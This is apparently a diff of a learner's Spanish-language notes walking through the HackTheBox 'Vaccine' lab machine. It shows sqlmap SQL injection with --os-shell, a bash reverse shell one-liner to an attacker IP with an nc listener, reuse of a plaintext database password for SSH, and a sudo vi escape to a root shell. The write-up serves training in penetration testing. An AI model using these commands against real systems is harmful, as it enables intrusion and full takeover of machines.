@@ -17,7 +17,7 @@
 	--os-shell
 
 7)¿Qué programa puede ejecutar el usuario postgres como root usando sudo?
-	
+	vi
 
 -----
 # [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]
@@ -87,26 +87,84 @@ Contraseña: ``qwerty789``
 Ponemos los datos de logeo y ya estamos adentro
 
 -------
-# SQL
+# SQLI con [[sqlmap NO USAR]] y mandamos una [[Reverse shell]]
 
 Al poner una ' en la parte de search nos aparece este error
 
 ![[Vaccine12.png]]
 Por esto que dice `ilike` sabemos que es [[postgresql]] ya que es un error caracteristico de esta base de datos
 Pero si probamos con otra inyeccion por ejemplo ``' or 1=1-- -``  ``o ' or 1=2-- -`` no nos aparece nada
+##### Esto es lo que pudimos sacar manualmente, a partir de aca usamos sqlmap que la verdad no lo queria usar, pero no encontre como mandar una revershell a traves de una sqli para hacer manual el proceso, asi que seguimos los pasos del writeup
 
 
+```
+ACLARACION IMPORTANTE: En la parte de cookie, poner el que tenga cada uno, desde la pagina logeado como administrador apretar CTRL + SHIFT + I y ver las cookies
+sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3        / Primero usar este comando que va a hacer el analisis
+sqlmap -u 'http://10.129.163.241/dashboard.php?search=any+query' --cookie="PHPSESSID=rmqiliocl577tgkamdu19smmbe" -v 3 --os-shell           /Agregando el parametro de os shell, nos va a dejar ejecutar comandos
+bash -c 'bash -i >& /dev/tcp/10.10.16.17/443 0>&1'                 / Este es el comando que vamos a poner para usar la revershell
+```
+Recordar estar en escucha con [[nc -nlvp 443]] para la [[Reverse shell]]
+El cookie seria el value de PHPSESSID
+![[Pasted image 20250629144142.png]]
 
-En el writeup usa sqlmap que no lo quiero usar y tengo que buscar de que forma manual lo vulneramos
-PONER EN CARPETAS LO DE COMPRIMIDORES DE ARCHIVOS Y MODIFICAR LO DE UNZIP
-HACER APUNTES DE ZIP2JOHN
-AGREGAR A APUNTES DE JOHN --format=raw-md5 md5
+![[Vaccine14.png]]
+
+![[Vaccine13.png]]
+
+-------
+# Conseguimos credenciales para conectarnos por [[ssh]]
+
+##### Algo a tener en cuenta es que es muy inestable la maquina, todo el tiempo se me iba la conexion y tenia que volver a mandar la [[Reverse shell]], por que no hice [[Tratamiento de la TTY]] ya que cada 30-60 segundos se me iba la conexion
+
+Desde la carpeta /var/www/html vamos a usar el comando `grep -riE "password|.*pasword|password.*"` para buscar posibles contraseñas
+
+![[Vaccine16.png]]
+*Resultado*
+dashboard.php:	 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+Probamos las contraseñas que usa para la base de datos postre en ssh y pudimos entrar, asi que sabemos que repite las credenciales que usa
+
+--------
+# Nos conectamos por [[ssh]]
+
+``ssh postgres@10.129.163.241`` y ponemos de contraseña `P@s5w0rd!`
+![[Vaccine17.png]]
+
+-----
+# [[Tratamiento de la TTY]]
+
+-----
+
+# Escalada de privilegios con [[Abuso de Sudo]]
+
+```shell
+sudo -l
+```
+
+![[Vaccine18.png]]
+Vemos que todos podemos ejecutar el binario /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+Vemos que vulnerabilidad hay en la pagina de [GTFOBINS](https://gtfobins.github.io/gtfobins/vi/#sudo)
+
+![[Vaccine22.png]]
+
+Asi que abrimos con ``sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`` el binario para abrirlo como root. Para posteriormente salir del vi ejecutando una bash
+
+![[Vaccine19.png]]
+
+Desde el vi apretamos `:` en el teclado y vamos a poner estos dos comandos
+```
+:set shell=/bin/sh
+:shell
+```
+![[Vaccine20.png]]
+
+Y listo ya tenemos la bash como root, ahora solo queda ver las flags
 
 
-
-
+![[Vaccine21.png]]
 
 
 -------
 # Creditos
 Writeup Oficial HackTheBox
+Writeup de [wetofu](https://wetofu.github.io/ctf/writeup/htb/htb-vaccine/)
